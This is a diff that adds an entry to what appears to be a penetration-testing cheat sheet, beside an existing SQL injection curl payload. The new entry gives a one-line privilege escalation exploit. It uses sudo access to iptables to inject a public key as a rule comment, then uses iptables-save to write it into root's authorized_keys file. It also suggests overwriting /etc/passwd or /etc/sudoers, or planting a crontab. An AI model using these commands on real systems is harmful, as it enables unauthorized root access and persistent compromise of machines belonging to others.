@@ -3510,11 +3510,21 @@ curl [url]/ -d "input=' or 1=1--+ "
 
 ---------------------
 
+### Iptables and iptables-save Arbitrary file overwrite as root
 
+---------------------
 
+- POC-:
 
+![image](https://github.com/user-attachments/assets/23c7cbae-087e-46b9-a3dd-d256c20b110b)
 
-  
+- Script-:
+
+```bash
+sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n[publickey]\n';sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
+```
+- You can overwrite the `/etc/passwd`,`/root/.ssh/authorized_keys`,`/etc/sudoers` or even create a malicious crontab.
+
 
 
 
